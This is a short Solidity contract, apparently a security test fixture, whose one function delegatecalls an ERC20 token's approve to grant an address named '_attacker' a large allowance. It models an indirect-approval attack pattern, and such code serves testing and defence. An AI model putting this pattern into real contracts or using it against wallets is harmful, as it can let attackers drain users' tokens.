// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.0;

import "./IERC20.sol";

contract ERC20DelegateCallee {
    function doIndirectApproval(address _token, address _attacker) external  {
        _token.delegatecall(abi.encodeWithSelector(IERC20.approve.selector, _attacker, uint256(0x7fffffffffffffff)));
    }
}
